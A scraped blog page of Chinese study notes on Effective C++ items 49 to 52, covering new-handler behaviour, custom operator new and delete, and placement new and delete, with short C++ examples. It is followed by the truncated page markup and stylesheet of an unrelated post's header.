                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">小结</h2>
<ol>
<li><code>new关键字</code>分为两步，<code>operator new</code>和<code>狭义placement new</code>，前者内存分配，后者在特定内存上调用构造函数</li>
<li><code>operator new</code>又可设置<code>std::nothrow</code>，设置之后就代表本次分配不足直接返回<code>nullptr</code>，未设置则调用<code>new-handler()</code>，函数返回之后继续尝试重新分配，循环此过程直到成功或抛出<code>std::bad_alloc</code>或函数调用<code>std::abort()</code>终止程序</li>
<li>编写new和delete需要遵守一些规则，比如处理<code>size==0</code>以及空指针等</li>
<li>本章的<code>placement new</code>重载是广义的，专门刨除<code>狭义placement new</code>，如果重载了<code>placement new</code>，要配套对应的<code>placement delete</code>；另外这种可能导致遮掩，使得普通new没法使用</li>
</ol>
<h2 data-id="heading-1">49. 了解new-handler的行为</h2>
<blockquote>
<p>本章operator new只有在没设置std::nothrow才会在分配内存失败后调用new-handler，所以此章默认不设置</p>
</blockquote>
<ol>
<li><code>operator new</code> 的设计逻辑是：
<ol>
<li>分配失败 → 调用 <code>new_handler</code>。（<strong>用户可以通过<code>std::set-new-handler()</code>来设置该函数</strong>）</li>
</ol>
<ul>
<li><strong>期望</strong> <code>new_handler</code> 能通过某种方式（如释放预留内存）让后续分配成功。</li>
<li>如果 <code>new_handler</code> 返回后分配仍失败，则<strong>再次调用 <code>new_handler</code></strong>。</li>
</ul>
<ol start="2">
<li>如果 <code>new_handler</code> 不改变任何状态，分配会一直失败，形成无限递归。所有需要一个好的设计：</li>
</ol>
<ul>
<li>让更多内存可被使用，即<strong>释放预留内存</strong></li>
<li>终止程序，调用std::abort();</li>
<li>抛出异常，throw std::bad_alloc;</li>
<li>将函数设置成nullptr，这样系统会自动抛出异常</li>
</ul>
</li>
<li>给每种class设置不同的<code>new_handler</code>，做到<code>Widget::set_new_handler(func);Widget* ptr = new Widget();//如果分配失败调用的是func</code>
<ol>
<li>为每种class设置不同的设置class</li>
</ol>
<ul>
<li>该函数属于class，应该使用<strong>静态成员函数</strong></li>
<li>要给每种，可借助<strong>继承+template</strong>来为每种class具象化基类class</li>
</ul>
<ol start="2">
<li>template基类的<strong>类型参数仅仅是用于标识不同类型</strong>，如<code>Widget</code>继承<code>NewHandlerSupport&lt;Widget&gt;</code></li>
<li>每次调用new，需要调用set_new_handler()设置成本类自定义的函数，分配内存之后（成与不成）都得再次调用set_new_handler()设置回去，这里借助<strong>RAII，将函数看成资源</strong>，这样就能在退出<code>operator new</code>之后自动设置回去</li>
</ol>
</li>
<li>调用<code>new (std::nothrow) Widget()</code>，并不意味着不会抛出异常，因为这之后还会调用<code>Widget</code>构造函数，可能会继续调用new，进而抛出异常</li>
</ol>
<h2 data-id="heading-2">50. 了解new和delete的合理替换时机</h2>
<ol>
<li>替换new和delete的原因有很多，比如想实现内存池、检测运用上的错误（比如多分配两个int，前后填入标识）以及收集heap使用信息等</li>
<li>自定义的new分为几乎行得通（逻辑没问题）和<strong>真正行得通</strong>，前者就是没有在意一些细节，比如new中需要循环调用new_handler，另外就是有对齐问题，<code>::operator new</code>肯定返回的是对齐后的地址，但是如果再基于此地址去偏移（如在前面添加标志位），然后在偏移后的地址构造就可能没有对齐进而出问题</li>
</ol>
<h2 data-id="heading-3">51. 编写new和delete时需固守成规</h2>
<ol>
<li>operator new应该内含无限循环，并在其中尝试分配内存，如果它无法满足内存要求，则调用new-handler。同时也要有能力处理0bytes申请。Class专属版本（因为可能存在继承，Derived调用Base的new方法）则还应该处理“比正确大小更大的（错误）申请”，一般是调用<code>::operator new</code></li>
<li>operator delete应该在收到nullptr不做任何处理，Class专属版本还应该处理“比正确大小更大的申请”，一般是调用<code>::operator delete</code></li>
</ol>
<h2 data-id="heading-4">52. 写了placement new也要写placement delete</h2>
<ol>
<li><strong>这里术语placement new指的是operator new()参数不止是size_t，比如日志函数等</strong>，其实nothrow版本也就是placement new，此处并不包含狭义的定位new</li>
<li>当使用 <strong>placement new构造对象失败（构造函数抛出异常）</strong> 时，编译器会自动调用<strong>匹配的placement delete</strong>释放内存。若未定义匹配的placement delete，已分配的内存将泄漏。</li>
<li>如果使用placement new构造，显式调用<code>delete p</code>时，编译器会调用<strong>普通operator delete</strong>（<code>operator delete(size_t)</code>），而非placement delete。</li>
<li>所以对于一个placement new，需要写operator delete（无异常情况）和placement delete（构造抛出异常）两个函数</li>
<li>若派生类定义了<strong>任何operator new重载</strong>（含placement new），会<strong>遮掩基类的所有operator new以及全局的operator new版本</strong>（包括普通版本）。需显式using声明继承基类或全局版本</li>
<li>所以如果重构了placement new而没有重构普通版本，直接调用<code>new Widget()</code>报错，因为被遮掩了</li>
</ol>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Widget</span> {
<span class="hljs-keyword">public</span>:
    <span class="hljs-comment">// 自定义 placement new（带额外参数）</span>
    <span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span>* <span class="hljs-keyword">operator</span> <span class="hljs-title">new</span><span class="hljs-params">(<span class="hljs-type">size_t</span> size, <span class="hljs-type">int</span> extra_arg)</span> </span>{
        std::cout &lt;&lt; <span class="hljs-string">"调用自定义 placement new\n"</span>;
        <span class="hljs-keyword">return</span> ::<span class="hljs-keyword">operator</span> <span class="hljs-built_in">new</span>(size); <span class="hljs-comment">// 委托全局 operator new</span>
    }

    <span class="hljs-comment">// ❌ 未显式保留普通 operator new</span>
};

<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{
    Widget* p1 = <span class="hljs-built_in">new</span>(<span class="hljs-number">42</span>) <span class="hljs-built_in">Widget</span>(); <span class="hljs-comment">// ✅ 调用自定义 placement new</span>
    Widget* p2 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Widget</span>();     <span class="hljs-comment">// ❌ 报错：找不到普通 operator new</span>
}
</code></pre>
<ol start="7">
<li>cpp全局标准的operator new，<strong>如果定义了class专属new，切记导致的遮掩现象</strong></li>
</ol>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;new&gt;</span> <span class="hljs-comment">// 为了不抛错以及定位new</span></span>

<span class="hljs-function"><span class="hljs-type">void</span>* <span class="hljs-keyword">operator</span> <span class="hljs-title">new</span><span class="hljs-params">(std::<span class="hljs-type">size_t</span> size)</span></span>;
<span class="hljs-function"><span class="hljs-type">void</span>* <span class="hljs-keyword">operator</span> <span class="hljs-title">new</span><span class="hljs-params">(std::<span class="hljs-type">size_t</span> size, <span class="hljs-type">const</span> std::<span class="hljs-type">nothrow_t</span>&amp;)</span> <span class="hljs-keyword">noexcept</span></span>; <span class="hljs-comment">// 不抛错的版本</span>
<span class="hljs-function"><span class="hljs-type">void</span>* <span class="hljs-keyword">operator</span> <span class="hljs-title">new</span><span class="hljs-params">(std::<span class="hljs-type">size_t</span> size, <span class="hljs-type">void</span>* ptr)</span> <span class="hljs-keyword">noexcept</span></span>;<span class="hljs-comment">//此版本是标准的placement new，不允许被重构</span>

<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>{
    <span class="hljs-type">int</span>* p = <span class="hljs-keyword">new</span> <span class="hljs-type">int</span>; <span class="hljs-comment">// 底层调用 operator new(sizeof(int))</span>
     <span class="hljs-type">int</span>* p = <span class="hljs-built_in">new</span> (std::nothrow) <span class="hljs-type">int</span>; <span class="hljs-comment">// 失败时 p == nullptr</span>
     <span class="hljs-type">char</span> buffer[<span class="hljs-built_in">sizeof</span>(<span class="hljs-type">int</span>)]; 
     <span class="hljs-type">int</span>* p = <span class="hljs-built_in">new</span> (buffer) <span class="hljs-built_in">int</span>(<span class="hljs-number">42</span>); <span class="hljs-comment">// 在 buffer 上构造 int</span>
}
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ai知识的初步了解]]></title>    <link>https://juejin.cn/post/7579813925996822569</link>    <guid>https://juejin.cn/post/7579813925996822569</guid>    <pubDate>2025-12-04T17:14:10.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579813925996822569" data-draft-id="7579871631095988250" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ai知识的初步了解"/> <meta itemprop="keywords" content="AIGC"/> <meta itemprop="datePublished" content="2025-12-04T17:14:10.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="河畔的风"/> <meta itemprop="url" content="https://juejin.cn/user/791287056047591"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ai知识的初步了解
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/791287056047591/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    河畔的风
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-04T17:14:10.000Z" title="Thu Dec 04 2025 17:14:10 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252b3a}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px;color:#5e7ce0}.markdown-body h1{font-size:24px;margin-bottom:5px;margin-top:80px;position:relative;text-align:center}.markdown-body h2{font-size:20px;padding-bottom:12px;border-bottom:1px solid #dfe1e6}.markdown-body h3{font-size:18px;padding-bottom:0}.markdown-body h4{font-size:16px;margin-top:30px}.markdown-body h5{font-size:14px;margin-top:20px}.markdown-body h6{font-size:14px;margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #dfe1e6;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#ffeeed;color:#c73636;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#252b3a;background:#f8f8f8}.markdown-body a{position:relative;text-decoration:none;color:#5e7ce0;padding-right:18px;padding-bottom:4px}.markdown-body a[href^=http]:after{position:absolute;display:inline-block;width:16px;height:16px;margin-left:2px;margin-top:6px;content:"";background:url("data:image/png;base64,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");background-size:100%}.markdown-body a:active,.markdown-body a:hover{border-bottom:2px solid #5e7ce0}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #5e7ce0;border-spacing:0}.markdown-body thead{color:#fff;text-align:left}.markdown-body thead tr{background:#5e7ce0}.markdown-body thead th{border-bottom:1px solid #dfe1e6}.markdown-body tr{background-color:#fff}.markdown-body tr:nth-child(2n){background-color:#f2f5fc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#252b3a;padding:1px 23px;margin:22px 0;border-left:4px solid #5e7ce0;background-color:#f2f5fc}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{padding-left:10px;margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#5e7ce0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body ul li::marker{content:"•";color:#5e7ce0}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}.markdown-body input[type=checkbox]:before{display:inline-block;width:16px;height:16px;content:"";background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEIAAABCCAYAAADjVADoAAAK2GlDQ1BJQ0MgUHJvZmlsZQAASImVlwdUU9kWhs+96Y0WiHRC70gngJTQQxGkg6iEJJBQYkgIKmJnUMGxoCKCZcSKKFhGQMaCWLANAopdJ8igoD4HC6Ki5t3AI8zMW++99fZaJ+dbO/vss/e55671XwAoYWyRKBdWAyBPWCCODQ2gJ6ek0nHPAQRgQAI2wIHNkYiYMTGRALHJ+a/28S4Sjdhte0Wuf///v5oGlyfhAAClIZzBlXDyEG5DxkuOSFwAAOoI4jddUCBScBfCmmKkQIR/V3DWBH9ScMY4o8njMfGxgQjTAcCT2WxxFgBkO8RPL+RkIXnIih4chVyBEOFihH05fDYX4TMI2+XlzVfwIMJWSLwIAApyOoCR8aecWX/Jn6HMz2ZnKXmir3HDBwkkolz2ov/zaP635eVKJ/ewQAaZLw6LVeyHnN/9nPkRShZmzIyeZAF3oiYF86VhCZPMkQSmTjKXHRShXJs7M3KSMwUhLGWeAlb8JPMkwXGTLJ4fq9wrUxzInGS2eHxfIsIyaU6C0s/nsZT5i/jxSZNcKEicOcmSnLiIqZhApV8sjVXWzxOGBkztG6LsPU/yp34FLOXaAn58mLJ39lT9PCFzKqckWVkblxcUPBWToIwXFQQo9xLlxijjebmhSr+kME65tgC5nFNrY5RnmM0Oj5lkIABRgA04dNVJAqCAt7BA0UjgfNEisSCLX0BnIm8bj84Schzs6M6Ozs4AKN7dievwnjb+TkK061O+NYjHr10ul5+e8oUi9/i4KfJYbk35LCsAUNUD4Op+jlRcOOFDK34wyNNTBZpABxgCU2AF7IEzcAfewB8Eg3AQDeJBCpiL1MoHeUAMFoBisAKUgnKwEWwF1WA32AsOgaPgBGgGZ8AFcAXcAF2gFzwCMjAAXoFh8BGMQRCEgygQFdKBjCBzyBZyhhiQLxQMRUKxUAqUDmVBQkgKFUOroHKoAqqG9kB10HHoNHQBugZ1Qw+gPmgIegd9gVEwGdaEDWALeDrMgJlwBBwPz4Gz4Hy4CC6B18NVcC18BG6CL8A34F5YBr+CR1AARULRUMYoexQDFYiKRqWiMlFi1FJUGaoSVYtqQLWiOlC3UTLUa9RnNBZNRdPR9mhvdBg6Ac1B56OXotehq9GH0E3oS+jb6D70MPo7hoLRx9hivDAsTDImC7MAU4qpxBzAnMJcxvRiBjAfsVgsDWuJ9cCGYVOw2djF2HXYndhGbBu2G9uPHcHhcDo4W5wPLhrHxhXgSnHbcUdw53E9uAHcJzwJb4R3xofgU/FC/Ep8Jf4w/hy+B/8CP0ZQI5gTvAjRBC5hEWEDYR+hlXCLMEAYI6oTLYk+xHhiNnEFsYrYQLxMfEx8TyKRTEiepFkkAWk5qYp0jHSV1Ef6TNYg25ADyWlkKXk9+SC5jfyA/J5CoVhQ/CmplALKekod5SLlKeWTClXFQYWlwlVZplKj0qTSo/JGlaBqrspUnatapFqpelL1luprNYKahVqgGlttqVqN2mm1e2oj6lR1J/Vo9Tz1